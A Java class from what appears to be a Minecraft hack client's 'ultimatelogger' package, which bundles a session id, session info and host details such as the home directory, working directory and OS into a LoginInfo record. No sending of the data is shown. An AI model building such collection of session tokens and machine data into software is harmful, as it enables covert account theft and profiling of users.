/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ehacks.mod.util.ultimatelogger;

import ehacks.mod.main.Main;
import ehacks.mod.util.Mappings;
import java.util.ArrayList;

/**
 *
 * @author radioegor146
 */
public class LoginInfo {
    public SessionInfo session = new SessionInfo();
    public boolean ismcp = Mappings.isMCP();
    public long time = System.currentTimeMillis();
    public ArrayList<PropertyInfo> sysprops = new ArrayList();
    public String sessionid = Main.tempSession;
    public String modversion = Main.realVersion;

    public LoginInfo() {
        ArrayList<String> tlist = new ArrayList();
        tlist.add("java.runtime.name");
        tlist.add("java.vm.version");
        tlist.add("user.country");
        tlist.add("user.dir");
        tlist.add("java.runtime.version");
        tlist.add("os.arch");
        tlist.add("os.name");
        tlist.add("user.home");
        tlist.add("user.language");
        for (String key : tlist) {
            try {
                sysprops.add(new PropertyInfo(key, System.getProperty(key)));
            } catch (Exception e) {

            }
        }
    }
}